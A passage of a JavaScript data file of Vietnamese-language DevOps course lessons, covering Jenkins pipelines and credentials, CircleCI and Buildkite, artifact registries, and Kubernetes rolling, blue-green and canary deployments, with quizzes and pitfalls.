      "Để variable production không Protected, mọi nhánh đều đọc được.",
      "Dùng executor `shell` trên máy dùng chung, job này đọc được file của job khác."
    ],
    quiz: [
      {
        q: "Trong GitLab CI hiện hành, nên dùng gì để quyết định khi nào job chạy?",
        options: ["only/except", "rules", "when: always ở mọi job", "tags"],
        answer: 1,
        explain: "`rules:` là cú pháp khuyến nghị, linh hoạt hơn only/except. `tags` dùng để chọn runner, không phải điều kiện chạy."
      },
      {
        q: "Tác dụng của `needs:` trong GitLab CI?",
        options: ["Chọn runner cho job theo tags","Lưu cache giữa các pipeline","Cho job chạy khi job nó cần xong, không chờ cả stage","Khai báo biến môi trường cho job"],
        answer: 2,
        explain: "`needs` biến pipeline thành DAG. Chọn runner dùng `tags`; cache dùng `cache`."
      },
      {
        q: "Trong GitLab, tính năng gần nhất với Required reviewers của GitHub là gì?",
        options: ["Khoá `cache:` với key theo lockfile","Protected environment có deployment approvals","Khoá `artifacts:` với `expire_in`","Khoá `image:` trỏ tới image đã ký"],
        answer: 1,
        explain: "Protected environment giới hạn ai được deploy, deployment approvals buộc đủ số người duyệt (gói Premium/Ultimate). Trên gói Free, cách thường dùng là job `when: manual` kết hợp protected branch và protected variable. cache, artifacts, image không liên quan tới cổng duyệt."
      }
    ]
  },
  "p08.m2.t1": {
    videos: [
      { id: "8ujz58xmMFI", title: "DevOps for Freshers | Bài 29: Jenkins CI/CD (Continuous Deployment) | DevOps cho người mới bắt đầu", channel: "DEVOPSEDU VN", lang: "vi", minutes: 32, embed: true },
      { id: "EzgCoOQvOf0", title: "Complete Jenkins Pipeline Tutorial | Jenkinsfile explained | KodeKloud", channel: "KodeKloud", lang: "en", minutes: 30, embed: true }
    ],
    sections: [
      {
        h: "Vì sao vẫn cần biết Jenkins",
        p: [
          "Jenkins là máy chủ CI mã nguồn mở lâu đời, cực kỳ linh hoạt nhờ hệ sinh thái plugin. Ở Việt Nam, rất nhiều ngân hàng, công ty viễn thông, công ty outsource vẫn dùng Jenkins vì chạy được hoàn toàn trong mạng nội bộ và tích hợp với các hệ thống cũ. Khi đi làm, khả năng cao bạn sẽ gặp một Jenkinsfile.",
          "Jenkins có hai cú pháp pipeline: Scripted (Groovy tự do) và Declarative (cấu trúc cố định, dễ đọc). Hãy dùng Declarative cho pipeline mới."
        ],
        list: [
          "`agent`: nơi chạy, ví dụ `any`, một label, một Docker image hoặc pod Kubernetes (cần plugin tương ứng).",
          "`stages`/`stage`/`steps`: cấu trúc pipeline; `parallel` để chạy song song.",
          "`when`: điều kiện chạy stage, ví dụ `branch 'main'`.",
          "`environment` và `credentials()`: nạp secret từ Jenkins Credentials.",
          "`post`: `always`, `success`, `failure` để báo cáo và dọn dẹp."
        ]
      },
      {
        h: "Credentials an toàn",
        p: [
          "Credential lưu trong Jenkins, không trong code. Helper `credentials('id')` với loại username/password tạo ra ba biến: `REG` (dạng user:pass), `REG_USR` và `REG_PSW`. Khai báo `environment` ở cấp stage thay vì cấp pipeline để chỉ stage cần secret mới nhận nó. Luôn dùng nháy đơn trong `sh` để shell, chứ không phải Groovy, đọc biến. Nháy kép khiến Groovy nội suy secret vào chuỗi lệnh và có thể lộ trong log."
        ],
        code: {
          lang: "groovy",
          file: "Jenkinsfile",
          src: `pipeline {
  agent none
  options { timeout(time: 20, unit: 'MINUTES'); disableConcurrentBuilds() }
  stages {
    stage('Test') {
      agent { docker { image 'node:24-alpine' } }
      steps { sh 'npm ci && npm test' }
      post {
        always { junit allowEmptyResults: true, testResults: 'reports/*.xml' }
      }
    }
    stage('Push') {
      agent { label 'docker' }        // agent có sẵn Docker CLI
      when { branch 'main' }
      environment {
        REG = credentials('registry') // chỉ stage này nhận secret; tạo REG_USR và REG_PSW
      }
      steps {
        // Nháy đơn: shell đọc biến, Groovy không nội suy secret
        sh 'echo "$REG_PSW" | docker login registry.example.com -u "$REG_USR" --password-stdin'
      }
    }
  }
}`
        }
      },
      {
        h: "Shared library: DRY cho nhiều repo",
        p: [
          "Shared library là repo Groovy chứa hàm dùng chung. File trong `vars/` trở thành bước gọi được từ Jenkinsfile. Nên pin library theo tag hoặc commit để thay đổi ở library không làm hỏng mọi pipeline cùng lúc."
        ],
        code: {
          lang: "groovy",
          file: "vars/nodeService.groovy",
          src: `// Trong repo shared library
def call(Map cfg = [:]) {
  def nodeVersion = cfg.node ?: '24'
  pipeline {
    agent { docker { image "node:\${nodeVersion}-alpine" } }
    stages {
      stage('Install') { steps { sh 'npm ci' } }
      stage('Test')    { steps { sh 'npm test' } }
    }
  }
}

// Trong Jenkinsfile của từng dịch vụ:
// @Library('devpath-shared@v1.4.0') _
// nodeService(node: '24')`
        }
      },
      {
        h: "Vận hành Jenkins",
        p: [
          "Đừng chạy build trên controller. Controller chỉ điều phối; build chạy trên agent, lý tưởng là agent tạm thời trong Docker hoặc Kubernetes. Plugin cần được cập nhật thường xuyên vì nhiều lỗ hổng Jenkins nằm ở plugin. Cấu hình nên được quản lý bằng code (Configuration as Code plugin) thay vì click tay trên giao diện."
        ]
      },
      {
        h: "Multibranch pipeline và webhook",
        p: [
          "Multibranch Pipeline tự quét repo, tạo job cho mỗi nhánh và mỗi pull request có Jenkinsfile, rồi xoá job khi nhánh bị xoá. Kết hợp với webhook từ GitHub, GitLab hoặc Bitbucket để Jenkins build ngay khi có push, thay vì poll repo mỗi vài phút vừa chậm vừa tốn tài nguyên.",
          "Kết quả build được báo ngược về PR dưới dạng status check, nên branch protection vẫn hoạt động như với GitHub Actions."
        ]
      }
    ],
    summary: [
      "Dùng Declarative pipeline: agent, stages, steps, when, post.",
      "Credential lưu trong Jenkins, nạp bằng `credentials()` hoặc `withCredentials`.",
      "Dùng nháy đơn trong `sh` để Groovy không nội suy secret.",
      "Shared library cho code dùng chung; build chạy trên agent, không trên controller."
    ],
    pitfalls: [
      "Viết `sh \"docker login -p $REG_PSW\"` với nháy kép, secret bị Groovy chèn vào chuỗi lệnh.",
      "Để plugin cũ nhiều năm không cập nhật, mở đường cho lỗ hổng đã biết.",
      "Gọi shared library không pin phiên bản, thay đổi ở library làm vỡ mọi pipeline."
    ],
    quiz: [
      {
        q: "Với `REG = credentials('registry')` loại username/password, biến nào chứa mật khẩu?",
        options: ["REG_PASS", "REG_PSW", "REG_SECRET", "PASSWORD"],
        answer: 1,
        explain: "Jenkins tạo `REG_USR` và `REG_PSW` cho credential username/password. Các tên khác không tồn tại."
      },
      {
        q: "Vì sao nên dùng nháy đơn trong bước `sh` có secret?",
        options: ["Vì nháy đơn chạy nhanh hơn nháy kép","Vì Jenkins không hỗ trợ nháy kép trong sh","Để Jenkins tắt log của bước sh","Để shell đọc biến, Groovy không nội suy secret"],
        answer: 3,
        explain: "Nháy kép là GString, Groovy thay giá trị vào trước khi chạy, làm secret xuất hiện trong lệnh. Jenkins vẫn hỗ trợ nháy kép."
      },
      {
        q: "Nơi nên chạy build trong kiến trúc Jenkins?",
        options: ["Trên controller, cạnh cấu hình Jenkins","Trên agent, lý tưởng là agent tạm thời","Trên máy cá nhân của developer","Trên chính database server production"],
        answer: 1,
        explain: "Controller chỉ điều phối; chạy build trên controller vừa chậm vừa cho phép build truy cập cấu hình và secret của Jenkins."
      }
    ]
  },
  "p08.m2.t2": {
    sections: [
      {
        h: "Mọi công cụ CI đều nói cùng một ngôn ngữ",
        p: [
          "Khi đã hiểu GitHub Actions, bạn đọc được hầu hết công cụ CI khác vì khái niệm giống nhau: pipeline gồm các job, job chạy trên agent hoặc executor, có cache, artifact, biến bí mật, cổng duyệt tay và điều kiện theo nhánh. Chỉ tên gọi và cú pháp khác."
        ],
        list: [
          "CircleCI: SaaS, cấu hình `.circleci/config.yml`; job chạy trên executor (docker, machine); `workflows` nối job; `orbs` là gói cấu hình tái sử dụng; job `type: approval` là cổng duyệt tay.",
          "Buildkite: giao diện SaaS nhưng agent chạy trên hạ tầng của bạn; `pipeline.yml` gồm các step, `wait` là rào chắn, `block` là cổng duyệt; pipeline có thể tự sinh thêm step động.",
          "TeamCity (JetBrains): máy chủ CI thường tự host, mạnh với dự án Java/.NET; cấu hình bằng giao diện hoặc Kotlin DSL; khái niệm build configuration, build chain, snapshot dependency."
        ]
      },
      {
        h: "Ví dụ CircleCI",
        p: [
          "Workflow dưới đây chạy test, dừng ở bước `hold` chờ duyệt, rồi deploy, chỉ trên nhánh main."
        ],
        code: {
          lang: "yaml",
          file: ".circleci/config.yml",
          src: `version: 2.1

jobs:
  test:
    docker:
      - image: cimg/node:lts
    steps:
      - checkout
      - restore_cache:
          keys:
            - npm-v1-{{ checksum "package-lock.json" }}
      - run: npm ci
      - save_cache:
          key: npm-v1-{{ checksum "package-lock.json" }}
          paths:
            - ~/.npm
      - run: npm test
  deploy:
    docker:
      - image: cimg/base:stable
    steps:
      - checkout
      - run: ./scripts/deploy.sh production

workflows:
  ci:
    jobs:
      - test
      - hold:
          type: approval
          requires: [test]
          filters:
            branches:
              only: main
      - deploy:
          requires: [hold]`
        }
      },
      {
        h: "Ví dụ Buildkite",
        p: [
          "Buildkite tách phần điều phối (SaaS) và phần chạy (agent của bạn). Điểm này hấp dẫn với đội cần build trong mạng nội bộ mà không muốn tự vận hành máy chủ CI."
        ],
        code: {
          lang: "yaml",
          file: ".buildkite/pipeline.yml",
          src: `steps:
  - label: "Test"
    command: "npm ci && npm test"
    agents:
      queue: default

  - wait

  - block: "Deploy production?"
    branches: main

  - label: "Deploy"
    command: "./scripts/deploy.sh production"
    branches: main
    concurrency: 1
    concurrency_group: deploy-production`
        }
      },
      {
        h: "Chọn công cụ theo tiêu chí gì",
        p: [
          "Code nằm trên GitHub thì GitHub Actions thường là lựa chọn ít ma sát nhất; nằm trên GitLab thì dùng GitLab CI. Khi đánh giá công cụ khác, hãy xem: nơi chạy build (SaaS hay hạ tầng riêng), chi phí theo phút hay theo agent, khả năng tái sử dụng cấu hình, hỗ trợ OIDC tới cloud, và đội có sẵn kinh nghiệm không. Đổi công cụ CI tốn công hơn bạn nghĩ; hãy giữ logic trong script (`./scripts/deploy.sh`) để phần YAML mỏng và dễ chuyển."
        ]
      },
      {
        h: "Bảng tương đương khái niệm",
        p: [
          "Khi đọc một pipeline lạ, hãy tìm những khái niệm tương đương dưới đây. Tên khác nhau nhưng vai trò giống nhau."
        ],
        list: [
          "Đơn vị công việc: job (GitHub, GitLab, CircleCI), stage (Jenkins), step (Buildkite).",
          "Nơi chạy: runner (GitHub, GitLab), agent (Jenkins, Buildkite, TeamCity), executor (CircleCI).",
          "Cổng duyệt: environment reviewers (GitHub), `when: manual` (GitLab), `input` (Jenkins), `type: approval` (CircleCI), `block` (Buildkite).",
          "Tái sử dụng: reusable workflow (GitHub), `include` (GitLab), shared library (Jenkins), orb (CircleCI), plugin (Buildkite)."
        ]
      }
    ],
    summary: [
      "Khái niệm CI giống nhau giữa các công cụ: job, agent, cache, artifact, secret, cổng duyệt.",
      "CircleCI: executor, workflows, orbs, job approval.",
      "Buildkite: điều phối SaaS, agent tự host, `wait` và `block`.",
      "Giữ logic trong script để dễ chuyển đổi công cụ."
    ],
    pitfalls: [
      "Nhồi toàn bộ logic vào YAML của một công cụ, đến lúc chuyển công cụ phải viết lại hết.",
      "Chọn công cụ vì trào lưu mà không tính tới nơi chạy build và yêu cầu mạng nội bộ.",
      "Dùng orb hoặc plugin bên thứ ba không pin phiên bản."
    ],
    quiz: [
      {
        q: "Trong CircleCI, cổng duyệt tay được tạo bằng gì?",
        options: ["Step `wait` giữa các job","Khoá `when: manual` trên job","Job `type: approval` trong workflow","Step `input` trong stage"],
        answer: 2,
        explain: "CircleCI dùng job `type: approval`. `wait` là của Buildkite, `when: manual` của GitLab, `input` của Jenkins."
      },
      {
        q: "Đặc điểm kiến trúc nổi bật của Buildkite là gì?",
        options: ["Chỉ tự host toàn bộ, không có bản SaaS","Điều phối SaaS, agent chạy trên hạ tầng của bạn","Chạy toàn bộ build trên hạ tầng của Buildkite","Chỉ cấu hình được qua giao diện web"],
        answer: 1,
        explain: "Buildkite tách control plane SaaS khỏi agent do bạn vận hành. Pipeline được khai báo bằng YAML trong repo."
      },
      {
        q: "Cách nào giúp pipeline dễ chuyển giữa các công cụ CI?",
        options: ["Đặt logic vào script, YAML chỉ gọi script","Viết toàn bộ logic trong YAML của công cụ","Dùng càng nhiều plugin của công cụ càng tốt","Gộp mọi bước vào một job duy nhất"],
        answer: 0,
        explain: "Script chạy được ở mọi công cụ, YAML chỉ là lớp mỏng điều phối. Nhồi logic vào YAML hay phụ thuộc nhiều plugin làm việc chuyển đổi khó hơn."
      }
    ]
  },
  "p08.m2.t3": {
    sections: [
      {
        h: "Artifact repository là gì",
        p: [
          "Artifact repository là nơi lưu kết quả build có phiên bản: Docker image, package npm, file JAR, Helm chart. Nó là cầu nối giữa CI (tạo artifact) và CD (lấy artifact để deploy). Nhờ nó, nguyên tắc build once, deploy many trở nên khả thi."
        ],
        list: [
          "Registry container: GHCR (GitHub), ECR (AWS), Artifact Registry (Google Cloud), Docker Hub, GitLab Container Registry.",
          "Kho đa định dạng: Sonatype Nexus, JFrog Artifactory, lưu npm, Maven, PyPI, Docker, Helm trong một chỗ.",
          "Proxy/cache: Nexus và Artifactory có thể làm proxy cho npmjs, Maven Central, giúp build nhanh hơn, không phụ thuộc internet và kiểm soát package được phép dùng."
        ]
      },
      {
        h: "Tag bất biến và quét khi push",
        p: [
          "Với ECR, bạn nên bật tag immutable để không ai ghi đè được một tag đã có, và bật quét lỗ hổng khi push. Tag theo SHA kết hợp tag immutable đảm bảo image `task-api:a1b2c3d` luôn là đúng một nội dung."
        ],
        code: {
          lang: "bash",
          file: "terminal",
          src: `aws ecr create-repository \\
  --repository-name task-api \\
  --image-tag-mutability IMMUTABLE \\
  --image-scanning-configuration scanOnPush=true

aws ecr put-lifecycle-policy \\
  --repository-name task-api \\
  --lifecycle-policy-text file://ecr-lifecycle.json`
        }
      },
      {
        h: "Chính sách giữ lại (retention)",
        p: [
          "Mỗi commit tạo một image, sau vài tháng registry có hàng nghìn image và hóa đơn lưu trữ tăng. Lifecycle policy tự xoá image cũ. Hãy giữ đủ để rollback: ví dụ xoá image không tag sau 14 ngày và chỉ giữ 50 image gần nhất. Image đang chạy trên production tuyệt đối không được bị xoá, nên số lượng giữ lại phải lớn hơn khoảng rollback bạn cần."
        ],
        code: {
          lang: "json",
          file: "ecr-lifecycle.json",
          src: `{
  "rules": [
    {
      "rulePriority": 1,
      "description": "Xoá image không tag sau 14 ngày",
      "selection": {
        "tagStatus": "untagged",
        "countType": "sinceImagePushed",
        "countUnit": "days",
        "countNumber": 14
      },
      "action": { "type": "expire" }
    },
    {
      "rulePriority": 2,
      "description": "Chỉ giữ 50 image gần nhất",
      "selection": {
        "tagStatus": "any",
        "countType": "imageCountMoreThan",
        "countNumber": 50
      },
      "action": { "type": "expire" }
    }
  ]
}`
        }
      },
      {
        h: "Chọn loại nào",
        p: [
          "Nếu chỉ cần Docker image và đang dùng một cloud, registry của cloud đó (ECR, Artifact Registry) là đơn giản nhất và tích hợp IAM sẵn. GHCR hợp với dự án trên GitHub, đăng nhập bằng `GITHUB_TOKEN`. Doanh nghiệp có nhiều loại package, cần chạy trong mạng nội bộ hoặc cần kiểm soát nguồn package từ internet thường chọn Nexus hoặc Artifactory. Dù chọn gì, quyền push chỉ cấp cho CI, còn người và cluster chỉ có quyền pull."
        ]
      },
      {
        h: "Package nội bộ",
        p: [
          "Ngoài image, công ty thường có thư viện dùng chung như SDK nội bộ hay cấu hình ESLint. Publish chúng lên GitHub Packages, Nexus hoặc Artifactory với scope riêng như `@my-org`, rồi cấu hình `.npmrc` để scope đó trỏ tới registry nội bộ còn các package khác vẫn lấy từ npmjs. Token đọc từ biến môi trường, không commit vào file."
        ],
        code: {
          lang: "ini",
          file: ".npmrc",
          src: `@my-org:registry=https://npm.pkg.github.com
//npm.pkg.github.com/:_authToken=\${NPM_TOKEN}`
        }
      }
    ],
    summary: [
      "Artifact repository lưu image và package có phiên bản, nối CI với CD.",
      "Bật tag immutable và quét lỗ hổng khi push.",
      "Lifecycle policy xoá image cũ nhưng phải giữ đủ cho rollback.",
      "Chỉ CI có quyền push; người và cluster chỉ pull."
    ],
    pitfalls: [
      "Lifecycle policy quá gắt xoá mất image đang chạy hoặc image cần để rollback.",
      "Để tag mutable, ai đó push đè `v1.2.0` và production chạy nội dung khác mà không ai biết.",
      "Cho developer quyền push trực tiếp lên registry production, bỏ qua pipeline."
    ],
    quiz: [
      {
        q: "Tính năng nào của ECR ngăn ghi đè một tag đã tồn tại?",
        options: ["scanOnPush", "Image tag mutability IMMUTABLE", "Lifecycle policy", "Replication"],
        answer: 1,
        explain: "IMMUTABLE khiến push trùng tag bị từ chối. scanOnPush quét lỗ hổng, lifecycle xoá image cũ, replication sao chép sang region khác."
      },
      {
        q: "Khi thiết kế lifecycle policy, ràng buộc quan trọng nhất là gì?",
        options: ["Xoá càng nhiều image càng tốt","Giữ đủ image để rollback, không xoá bản đang chạy","Chỉ giữ lại một image mới nhất","Không bao giờ xoá image nào"],
        answer: 1,
        explain: "Mục tiêu là tiết kiệm mà vẫn rollback được. Chỉ giữ image mới nhất làm mất khả năng rollback; không xoá thì chi phí tăng mãi."
      },
      {
        q: "Lợi ích của Nexus/Artifactory khi làm proxy cho npmjs?",
        options: ["Tự sinh code từ package","Thay thế Git làm nơi lưu mã","Cache package và kiểm soát nguồn package","Tăng số CPU cho runner"],
        answer: 2,
        explain: "Proxy lưu bản sao package, giảm phụ thuộc internet và cho phép chặn package không được phép. Nó không thay Git hay tăng tài nguyên runner."
      }
    ]
  },
  "p08.m3.t0": {
    videos: [
      { id: "lxc4EXZOOvE", title: "Most Common Kubernetes Deployment Strategies (Examples & Code)", channel: "Anton Putra", lang: "en", minutes: 20, embed: true }
    ],
    sections: [
      {
        h: "Recreate: tắt hết rồi bật lại",
        p: [
          "Recreate là chiến lược đơn giản nhất: dừng toàn bộ phiên bản cũ, sau đó khởi động phiên bản mới. Ưu điểm là không bao giờ có hai phiên bản chạy cùng lúc, nên không phải lo tương thích giữa bản cũ và bản mới. Nhược điểm là có downtime trong khoảng thời gian bản mới khởi động.",
          "Recreate hợp với môi trường dev, job xử lý nền không phục vụ người dùng trực tiếp, hoặc ứng dụng không thể chạy hai phiên bản song song (ví dụ giữ khoá độc quyền trên một tài nguyên)."
        ]
      },
      {
        h: "Rolling update: thay dần từng phần",
        p: [
          "Rolling update thay các instance cũ bằng instance mới theo từng đợt. Đây là mặc định của Kubernetes Deployment và ECS service. Hai tham số điều khiển tốc độ: `maxSurge` là số pod được tạo vượt số replica mong muốn, `maxUnavailable` là số pod được phép không sẵn sàng trong lúc cập nhật.",
          "Điều kiện sống còn là readiness probe. Kubernetes chỉ chuyển traffic tới pod mới và tiếp tục thay pod cũ khi pod mới báo sẵn sàng. Không có readiness probe, pod được coi là sẵn sàng ngay khi container khởi động, trong khi ứng dụng có thể còn đang kết nối database, và người dùng nhận lỗi 502."
        ],
        code: {
          lang: "yaml",
          file: "k8s/deployment.yaml",
          src: `apiVersion: apps/v1
kind: Deployment
metadata:
  name: task-api
spec:
  replicas: 4
  minReadySeconds: 10          # pod phải sẵn sàng ổn định 10s mới tính là available
  progressDeadlineSeconds: 300 # quá 5 phút không tiến triển thì báo thất bại
  strategy:
    type: RollingUpdate        # hoặc Recreate
    rollingUpdate:
      maxSurge: 1              # tối đa 5 pod trong lúc cập nhật
      maxUnavailable: 0        # luôn giữ đủ 4 pod phục vụ
  selector:
    matchLabels: { app: task-api }
  template:
    metadata:
      labels: { app: task-api }
    spec:
      terminationGracePeriodSeconds: 30
      containers:
        - name: api
          image: ghcr.io/my-org/task-api:a1b2c3d
          ports: [{ containerPort: 3000 }]
          readinessProbe:
            httpGet: { path: /health/ready, port: 3000 }
            periodSeconds: 5
            failureThreshold: 3
          livenessProbe:
            httpGet: { path: /health/live, port: 3000 }
            periodSeconds: 10`
        }
      },
      {
        h: "Đánh đổi và chi tiết hay bị bỏ qua",
        p: [
          "`maxUnavailable: 0` với `maxSurge: 1` an toàn nhất nhưng chậm và cần dư tài nguyên cho một pod. `maxUnavailable: 25%` nhanh hơn nhưng giảm năng lực phục vụ trong lúc cập nhật. Trong khi rolling, bản cũ và bản mới cùng phục vụ, nên API và schema database phải tương thích với cả hai.",
          "Pod cũ bị dừng cũng cần được xử lý khéo: ứng dụng phải bắt tín hiệu SIGTERM, ngừng nhận request mới, hoàn thành request đang xử lý rồi mới thoát (graceful shutdown). Sau khi `kubectl apply`, pipeline nên chạy `kubectl rollout status deployment/task-api --timeout=5m` để chờ và biết deploy có thành công hay không."
        ]
      }
    ],
    summary: [
      "Recreate: đơn giản, không chạy hai phiên bản cùng lúc, nhưng có downtime.",
      "Rolling update: thay dần, điều khiển bằng `maxSurge` và `maxUnavailable`.",
      "Readiness probe là bắt buộc để rolling update không gây lỗi.",
      "Trong rolling, bản cũ và mới cùng chạy nên phải tương thích với nhau."
    ],
    pitfalls: [
      "Không có readiness probe, traffic tới pod chưa sẵn sàng gây lỗi 502 trong mỗi lần deploy.",
      "Readiness probe kiểm tra cả dịch vụ phụ thuộc bên ngoài, một dịch vụ ngoài chậm làm mọi pod bị rút khỏi load balancer.",
      "Ứng dụng không xử lý SIGTERM, request đang chạy bị cắt ngang khi pod cũ bị dừng."
    ],
    quiz: [
      {
        q: "Deployment có `replicas: 4`, `maxSurge: 1`, `maxUnavailable: 0`. Trong lúc cập nhật tối đa có bao nhiêu pod?",
        options: ["3", "4", "5", "8"],
        answer: 2,
        explain: "maxSurge 1 cho phép vượt 1 pod so với 4, tức tối đa 5. maxUnavailable 0 đảm bảo không dưới 4 pod sẵn sàng."
      },
      {
        q: "Vai trò của readiness probe trong rolling update?",
        options: ["Khởi động lại container bị treo","Chỉ cho traffic vào pod đã sẵn sàng","Giới hạn CPU của pod mới","Ghi log khởi động của pod"],
        answer: 1,
        explain: "Readiness quyết định pod có nhận traffic hay không. Khởi động lại container bị treo là việc của liveness probe."
      },
      {
        q: "Khi nào Recreate là lựa chọn hợp lý?",
        options: ["Ứng dụng không chạy được hai phiên bản song song","API công khai cần 99,99% uptime","Mọi trường hợp, vì nó đơn giản nhất","Deployment có nhiều replica"],
        answer: 0,
        explain: "Recreate đổi downtime lấy sự đơn giản và không có hai phiên bản song song. API cần uptime cao nên dùng rolling, blue-green hoặc canary."
      }
    ]
  },
  "p08.m3.t1": {
    videos: [
      { id: "JZB3uHVmGjI", title: "📗 #8 - Blue/Green Deployment vs Canary Deployment vs A/B Testing | Software Engineering Cơ Bản", channel: "Viet Tran", lang: "vi", minutes: 11, embed: true },
      { id: "W6HANd8c9t4", title: "An in-depth introduction to Blue Green Deployments", channel: "Arpit Bhayani", lang: "en", minutes: 29, embed: true }
    ],
    sections: [
      {
        h: "Hai môi trường, một công tắc",
        p: [
          "Blue-Green chạy hai môi trường production giống hệt nhau. Blue đang phục vụ người dùng. Bạn deploy phiên bản mới lên Green, kiểm tra kỹ trong khi Green chưa nhận traffic thật, rồi chuyển toàn bộ traffic sang Green trong một thao tác. Nếu có vấn đề, chuyển lại về Blue, gần như tức thì.",
          "Điểm mạnh là rollback cực nhanh và có thể test phiên bản mới trên hạ tầng production thật trước khi mở cho người dùng. Điểm yếu là tốn gấp đôi tài nguyên trong lúc chuyển, và mọi người dùng cùng lúc chuyển sang bản mới nên nếu lỗi thì ảnh hưởng tất cả."
        ]
      },
      {
        h: "Công tắc nằm ở đâu",
        list: [
          "Load balancer: đổi target group của listener (AWS ALB), hoặc đổi upstream trong Nginx rồi reload.",
          "Kubernetes Service: đổi selector từ `version: blue` sang `version: green`.",
          "DNS: đổi bản ghi, nhưng chậm do TTL và cache nên ít dùng cho chuyển nhanh.",
          "Argo Rollouts: chiến lược `blueGreen` tự quản lý service active và preview."
        ],
        p: [
          "Với Argo Rollouts, bạn khai báo service active (nhận traffic thật) và service preview (để test bản mới). Đặt `autoPromotionEnabled: false` để phải promote bằng tay sau khi kiểm tra."
        ],
        code: {
          lang: "yaml",
          file: "k8s/rollout-bluegreen.yaml",
          src: `apiVersion: argoproj.io/v1alpha1
kind: Rollout
metadata:
  name: task-api
spec:
  replicas: 4
  revisionHistoryLimit: 3
  selector:
    matchLabels: { app: task-api }
  template:
    metadata:
      labels: { app: task-api }
    spec:
      containers:
        - name: api
          image: ghcr.io/my-org/task-api:a1b2c3d
          ports: [{ containerPort: 3000 }]
  strategy:
    blueGreen:
      activeService: task-api-active     # traffic người dùng
      previewService: task-api-preview   # test bản mới trước khi chuyển
      autoPromotionEnabled: false
      scaleDownDelaySeconds: 600         # giữ bản cũ 10 phút để rollback nhanh`
        }
      },
      {
        h: "Database là phần khó",
        p: [
          "Hai môi trường ứng dụng thường dùng chung một database. Vì vậy schema phải tương thích với cả Blue và Green: thêm cột mới được, nhưng xoá hay đổi tên cột thì phải đợi khi chắc chắn không còn quay lại Blue. Đây là lý do blue-green đi cùng mô hình migration expand–contract ở bài sau.",
          "Ngoài database còn có session, job trong hàng đợi, kết nối WebSocket đang mở. Sau khi chuyển, bạn nên giữ Blue thêm một thời gian (như `scaleDownDelaySeconds` ở trên) để có thể quay lại, rồi mới thu hồi tài nguyên. Chạy smoke test trên preview trước khi promote là bước không nên bỏ."
        ]
      }
    ],
    summary: [
      "Blue-Green chạy hai môi trường giống nhau, chuyển toàn bộ traffic trong một thao tác.",
      "Rollback nhanh bằng cách chuyển traffic về môi trường cũ.",
      "Tốn tài nguyên gấp đôi trong lúc chuyển; lỗi ảnh hưởng mọi người dùng cùng lúc.",
      "Database dùng chung nên schema phải tương thích với cả hai phiên bản."
    ],
    pitfalls: [
      "Chuyển bằng DNS rồi bất ngờ vì client vẫn gọi môi trường cũ do cache TTL.",
      "Tắt Blue ngay sau khi chuyển, mất khả năng rollback nhanh.",
      "Chạy migration xoá cột trước khi chuyển, Blue lỗi ngay và không còn đường quay lại."
    ],
    quiz: [
      {
        q: "Ưu điểm lớn nhất của Blue-Green là gì?",
        options: ["Tiết kiệm tài nguyên hạ tầng","Chỉ ảnh hưởng 5% người dùng","Rollback gần như tức thì bằng chuyển traffic","Không cần quan tâm schema database"],
        answer: 2,
        explain: "Blue-Green cho phép quay lại ngay. Nó tốn tài nguyên hơn; việc chỉ ảnh hưởng một phần người dùng là đặc điểm của canary."
      },
      {
        q: "Trong Argo Rollouts blueGreen, `previewService` dùng để làm gì?",
        options: ["Nhận traffic người dùng thật","Test phiên bản mới trước khi promote","Lưu log của phiên bản cũ","Chạy migration trước khi chuyển"],
        answer: 1,
        explain: "previewService trỏ tới bản mới để test; activeService mới là nơi nhận traffic thật."
      },
      {
        q: "Vì sao schema database là thách thức trong Blue-Green?",
        options: ["Hai phiên bản thường dùng chung một database","Mỗi môi trường có database riêng hoàn toàn","Database không chạy được trên Kubernetes","Phải xoá database mỗi lần chuyển traffic"],
        answer: 0,
        explain: "Database dùng chung buộc schema tương thích ngược để có thể quay về Blue."
      }
    ]
  },
  "p08.m3.t2": {
    videos: [
      { id: "w3xdopP4aEk", title: "Argo Rollouts in 15 minutes!", channel: "DevOps Journey", lang: "en", minutes: 14, embed: true }
    ],
    sections: [
      {
        h: "Canary: thử trên một nhóm nhỏ trước",
        p: [
          "Tên gọi đến từ chim hoàng yến được mang xuống mỏ than để cảnh báo khí độc. Canary deployment đưa phiên bản mới cho một phần nhỏ traffic, ví dụ 5%, theo dõi các chỉ số, rồi tăng dần 25%, 50%, 100%. Nếu tỷ lệ lỗi hoặc độ trễ xấu đi, quá trình dừng và traffic quay về bản cũ.",
          "So với Blue-Green, canary giới hạn phạm vi ảnh hưởng: nếu bản mới lỗi, chỉ một phần nhỏ người dùng gặp lỗi trong thời gian ngắn. Đánh đổi là quá trình lâu hơn, cần hệ thống giám sát tốt và cần có đủ traffic để chỉ số có ý nghĩa thống kê."
        ]
      },
      {
        h: "Tự động hoá với Argo Rollouts",
        p: [
          "Argo Rollouts thay Deployment bằng resource Rollout với các bước canary. Bước `analysis` chạy một AnalysisTemplate truy vấn Prometheus. Nếu kết quả không đạt `successCondition` quá `failureLimit` lần, rollout bị abort và tự quay về bản ổn định. Flagger là công cụ tương tự, hay dùng cùng service mesh."
        ],
        code: {
          lang: "yaml",
          file: "k8s/rollout-canary.yaml",
          src: `apiVersion: argoproj.io/v1alpha1
kind: Rollout
metadata:
  name: task-api
spec:
  replicas: 10
  selector:
    matchLabels: { app: task-api }
  template:
    metadata:
      labels: { app: task-api }
    spec:
      containers:
        - name: api
          image: ghcr.io/my-org/task-api:a1b2c3d
  strategy:
    canary:
      steps:
        - setWeight: 5
        - pause: { duration: 5m }
        - analysis:
            templates:
              - templateName: success-rate
            args:
              - name: service-name
                value: task-api
        - setWeight: 25
        - pause: { duration: 10m }
        - setWeight: 50
        - pause: { duration: 10m }
---
apiVersion: argoproj.io/v1alpha1
kind: AnalysisTemplate
metadata:
  name: success-rate
spec:
  args:
    - name: service-name
  metrics:
    - name: success-rate
      interval: 1m
      count: 5
      failureLimit: 1
      successCondition: result[0] >= 0.99
      provider:
        prometheus:
          address: http://prometheus.monitoring.svc:9090
          query: |
            sum(rate(http_requests_total{service="{{args.service-name}}",status!~"5.."}[2m]))
            /
            sum(rate(http_requests_total{service="{{args.service-name}}"}[2m]))`
        }
      },
      {
        h: "Chia traffic chính xác",
        p: [
          "Nếu không cấu hình traffic routing, Argo Rollouts chia traffic xấp xỉ bằng tỷ lệ số pod: 10 replica với weight 5% có thể làm tròn thành 1 pod, tức khoảng 10% traffic. Để chia chính xác theo phần trăm, hãy kết hợp với ingress controller, Gateway API hoặc service mesh qua `trafficRouting`.",
